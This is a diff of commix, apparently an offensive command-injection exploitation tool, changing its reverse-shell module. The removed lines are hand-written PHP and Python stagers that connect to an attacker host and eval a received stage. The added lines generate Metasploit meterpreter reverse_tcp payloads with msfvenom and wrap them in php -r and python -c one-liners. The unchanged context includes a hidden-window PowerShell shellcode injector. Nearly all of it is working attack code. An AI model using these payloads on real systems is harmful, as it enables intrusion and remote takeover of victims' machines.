@@ -172,45 +172,52 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
         print settings.print_error_msg(error_msg)
         continue
 
-      other_shell ="""/*<?php /**/ error_reporting(0); 
-$ip = '""" + settings.LHOST  + """'; $port = """ + settings.LPORT  + """;
-if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
-$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f))
-{ $s = $f($ip, $port); $s_type = 'stream'; }
-elseif (($f = 'socket_create') && is_callable($f))
-{ $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port);
-if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); }
-if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4);
-break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } 
-$a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) 
-{ switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break;
-case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
-      other_shell = base64.b64encode(other_shell)
-      if settings.TARGET_OS == "win": 
-        print ""
-        while True:
-          question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
-          question_msg += "' as PHP working directory on the target host? [Y/n] > "
-          sys.stdout.write(settings.print_question_msg(question_msg))
-          php_dir = sys.stdin.readline().replace("\n","").lower()
-          if php_dir in settings.CHOICE_YES:
-            break
-          elif php_dir in settings.CHOICE_NO:
-            question_msg = "Please provide a custom working directory for PHP (e.g. '" 
-            question_msg += settings.WIN_PHP_DIR + "') > "
-            sys.stdout.write(settings.print_question_msg(question_msg))
-            settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
-            break
-          else:
-            if php_dir == "":
-              php_dir = "enter"
-            err_msg = "'" + php_dir + "' is not a valid answer."  
-            print settings.print_error_msg(err_msg)
-            pass
+      payload = "php/meterpreter/reverse_tcp"
+      output = "php_meterpreter.txt"
 
-        other_shell = settings.WIN_PHP_DIR + " -r eval(base64_decode(" + other_shell + "));"
-      else:
-        other_shell = "php -r \"eval(base64_decode(" + other_shell + "));\""
+      info_msg = "Generating the '" + payload + "' payload... "
+      sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+      sys.stdout.flush()
+      try:
+        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
+          " LHOST=" + str(settings.LHOST) + 
+          " LPORT=" + str(settings.LPORT) + 
+          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()
+
+        with open (output, "r+") as content_file:
+          data = content_file.readlines()
+          data = ''.join(data).replace("\n"," ")
+
+        if settings.TARGET_OS == "win": 
+          print ""
+          while True:
+            question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
+            question_msg += "' as PHP working directory on the target host? [Y/n] > "
+            sys.stdout.write(settings.print_question_msg(question_msg))
+            php_dir = sys.stdin.readline().replace("\n","").lower()
+            if php_dir in settings.CHOICE_YES:
+              break
+            elif php_dir in settings.CHOICE_NO:
+              question_msg = "Please provide a custom working directory for PHP (e.g. '" 
+              question_msg += settings.WIN_PHP_DIR + "') > "
+              sys.stdout.write(settings.print_question_msg(question_msg))
+              settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
+              break
+            else:
+              if php_dir == "":
+                php_dir = "enter"
+              err_msg = "'" + php_dir + "' is not a valid answer."  
+              print settings.print_error_msg(err_msg)
+              pass
+
+          other_shell = settings.WIN_PHP_DIR + " -r " + data
+        else:
+          other_shell = "php -r \"" + data + "\""
+        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        # Remove the ouput file.
+        os.remove(output)
+      except:
+        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
       break
 
     # Python-reverse-shell (meterpreter)
@@ -221,39 +228,52 @@ case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgs
         print settings.print_error_msg(error_msg)
         continue
 
-      other_shell = """import socket,struct
-s=socket.socket(2,1)
-s.connect(('""" + settings.LHOST + """',""" + settings.LPORT + """))
-l=struct.unpack('>I',s.recv(4))[0]
-d=s.recv(4096)
-while len(d)!=l:
-  d+=s.recv(4096)
-exec(d,{'s':s})"""      
-      other_shell = base64.b64encode(other_shell)
-      if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-        print ""
-        while True:
-          question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-          question_msg += "' as Python working directory on the target host? [Y/n] > "
-          sys.stdout.write(settings.print_question_msg(question_msg))
-          python_dir = sys.stdin.readline().replace("\n","").lower()
-          if python_dir in settings.CHOICE_YES:
-            break
-          elif python_dir in settings.CHOICE_NO:
-            question_msg = "Please provide a custom working directory for Python (e.g. '" 
-            question_msg += settings.WIN_PYTHON_DIR + "') > "
+      payload = "python/meterpreter/reverse_tcp"
+      output = "py_meterpreter.txt"
+
+      info_msg = "Generating the '" + payload + "' payload... "
+      sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+      sys.stdout.flush()
+      try:
+        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
+          " LHOST=" + str(settings.LHOST) + 
+          " LPORT=" + str(settings.LPORT) + 
+          " -o " + output + ">/dev/null 2>&1", shell=True).wait()
+        
+        with open (output, "r") as content_file:
+          data = content_file.readlines()
+          data = ''.join(data)
+          data = base64.b64encode(data)
+
+        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
+          print ""
+          while True:
+            question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
+            question_msg += "' as Python working directory on the target host? [Y/n] > "
             sys.stdout.write(settings.print_question_msg(question_msg))
-            settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
-            break
-          else:
-            if python_dir == "":
-              python_dir = "enter"
-            err_msg = "'" + python_dir + "' is not a valid answer."  
-            print settings.print_error_msg(err_msg)
-            pass
-        other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + other_shell + "'.decode('base64'))"
-      else:
-        other_shell = "python -c \"exec('" + other_shell + "'.decode('base64'))\""
+            python_dir = sys.stdin.readline().replace("\n","").lower()
+            if python_dir in settings.CHOICE_YES:
+              break
+            elif python_dir in settings.CHOICE_NO:
+              question_msg = "Please provide a custom working directory for Python (e.g. '" 
+              question_msg += settings.WIN_PYTHON_DIR + "') > "
+              sys.stdout.write(settings.print_question_msg(question_msg))
+              settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
+              break
+            else:
+              if python_dir == "":
+                python_dir = "enter"
+              err_msg = "'" + python_dir + "' is not a valid answer."  
+              print settings.print_error_msg(err_msg)
+              pass
+          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+        else:
+          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        # Remove the ouput file.
+        os.remove(output)
+      except:
+        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
       break
 
     elif other_shell == '7':
@@ -278,12 +298,13 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
           payload = "windows/meterpreter/reverse_tcp"
           output = "powershell_attack.txt"
 
+          # define standard metasploit payload
+          info_msg = "Generating the '" + payload + "' shellcode... "
+          sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+          sys.stdout.flush()
+
           # TrustedSec's Magic Unicorn (3rd Party)
           if windows_reverse_shell == '1':
-            # define standard metasploit payload
-            info_msg = "Please wait, while generating the payload shellcode... "
-            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
-            sys.stdout.flush()
             try:
               proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
               with open(output, 'r') as content_file:
@@ -294,7 +315,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-              # Remove the "powershell_attack.txt" file.
+              # Remove the ouput file.
               os.remove(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
@@ -303,10 +324,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
           if windows_reverse_shell == '2':
             unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
             os.chdir(unicorn_path)
-            # define standard metasploit payload
-            info_msg = "Please wait, while generating the payload shellcode... "
-            sys.stdout.write("\n" + settings.print_info_msg(info_msg))
-            sys.stdout.flush()
             try:
               subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
               # Remove the "unicorn.rc" file.
@@ -314,7 +331,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               with open(output, 'r') as content_file:
                 other_shell = content_file.read().replace('\n', '')
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-              # Remove the "powershell_attack.txt" file.
+              # Remove the ouput file.
               os.remove(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
